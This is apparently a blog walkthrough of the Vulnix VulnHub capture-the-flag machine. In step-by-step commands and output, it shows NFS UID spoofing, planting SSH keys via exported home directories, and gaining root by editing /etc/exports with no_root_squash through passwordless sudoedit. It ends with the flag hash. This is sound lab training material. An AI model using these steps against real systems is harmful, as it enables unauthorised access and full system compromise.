---
layout: single
title: Vulnix CTF Walkthrough
date: 2017-08-21
categories:
  - security
  - ctf
  - walkthrough
tags:
  - vulnix
  - vulnhub
---
## Service Discovery & Enumeration
Nmap [`nmap -sS -sV -sC 192.168.22.134`] revealed a number of different services for this box, offering a lot of potential enumeration points:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
79/tcp   open  finger   Linux fingerd
110/tcp  open  pop3     Dovecot pop3d
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      42005/udp  mountd
|   100005  1,2,3      54538/tcp  mountd
|   100021  1,3,4      37679/tcp  nlockmgr
|   100021  1,3,4      50827/udp  nlockmgr
|   100024  1          49501/udp  status
|   100024  1          53102/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
143/tcp  open  imap     Dovecot imapd
512/tcp  open  exec     netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell    Netkit rshd
993/tcp  open  ssl/imap Dovecot imapd
995/tcp  open  ssl/pop3 Dovecot pop3d
2049/tcp open  nfs_acl  2-3 (RPC #100227)
```

The first service I took a look at was the NFS daemon, by looking at the export list on the host machine:

```shell_session
root@kali:~# showmount -e 192.168.22.134
Export list for 192.168.22.134:
/home/vulnix *
```

The home directory of the `vulnix` user is being exposed, which presents a potentially easy access point. Prior to NFSv4, it's possible to view the owner UID and GID of a remote share, so I tried to mount the share using NFSv3:

```shell_session
root@kali:~/vulnix# mkdir mnt && mount 192.168.22.134:/home/vulnix mnt -o vers=3
root@kali:~/vulnix# ls -l
total 4
drwxr-x--- 2 2008 2008 4096 Sep  2  2012 mnt
```

As can be seen in the above output, the owning user and group have the IDs `2008`. There are multiple tools available to aid in spoofing this, but it's also as easy to just add a new user with the specified ID, so I created a new user with ID 2008, switched to it, and then had access to the share:

```shell_session
root@kali:~/vulnix# useradd -u 2008 vulnix
root@kali:~/vulnix# su vulnix
$ cd mnt
$ ls -lah
total 20K
drwxr-x--- 2 vulnix vulnix 4.0K Sep  2  2012 .
drwxr-xr-x 3 root   root   4.0K Aug 20 15:28 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3.5K Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```

Now that I had remote write access as `vulnix`, I created a new SSH key pair, and copied the public key into `.ssh/authorized_keys`, which then allowed me to SSH in to the box as `vulnix`

```shell_session
root@kali:~/vulnix# ssh -i id_rsa vulnix@192.168.22.134
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Aug 20 16:47:57 BST 2017

  System load:  0.0              Processes:           90
  Usage of /:   90.2% of 773MB   Users logged in:     0
  Memory usage: 7%               IP address for eth0: 192.168.22.134
  Swap usage:   0%

  => / is using 90.2% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

vulnix@vulnix:~$
```

## Getting Root Access
Looking at the sudo privileges for `vulnix`, I could see that the user is able to edit the NFS exports without the need for a password:

```shell_session
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

By using `sudoedit /etc/exports`, it's possible to add another share into the export list, one which uses the `no_squash_root` option; which prevents root users being remapped to the `nobody` user:

```conf
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,root_squash)
/root *(rw,no_root_squash)
```

This change doesn't automatically get applied, but will do so upon a system reboot. After rebooting the VM, the new share into the `/root` directory can be seen:

```shell_session
root@kali:~/vulnix# showmount -e 192.168.22.134
Export list for 192.168.22.134:
/root        *
/home/vulnix *
```

Following the same steps as before, it is now possible to add an SSH key into `/root/.ssh/authorized_keys` and gain root access:

```shell_session
root@kali:~/vulnix# mount 192.168.22.134:/root mnt -o vers=3
root@kali:~/vulnix# cd mnt
root@kali:~/vulnix/mnt# ls -la
total 28
drwx------ 3 root root 4096 Sep  2  2012 .
drwxr-xr-x 5 root root 4096 Aug 20 16:33 ..
-rw------- 1 root root    0 Sep  2  2012 .bash_history
-rw-r--r-- 1 root root 3106 Apr 19  2012 .bashrc
drwx------ 2 root root 4096 Sep  2  2012 .cache
-rw-r--r-- 1 root root  140 Apr 19  2012 .profile
-r-------- 1 root root   33 Sep  2  2012 trophy.txt
-rw------- 1 root root  710 Sep  2  2012 .viminfo
root@kali:~/vulnix/mnt# mkdir .ssh
root@kali:~/vulnix/mnt# cp ../id_rsa.pub .ssh/authorized_keys

root@kali:~/vulnix# ssh -i id_rsa root@192.168.22.134
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Aug 20 17:51:41 BST 2017

  System load:  0.0              Processes:           93
  Usage of /:   90.2% of 773MB   Users logged in:     0
  Memory usage: 7%               IP address for eth0: 192.168.22.134
  Swap usage:   0%

  => / is using 90.2% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/

root@vulnix:~# ls
trophy.txt
root@vulnix:~# cat trophy.txt
cc614640424f5bd60ce5d5264899c3be
root@vulnix:~#
```
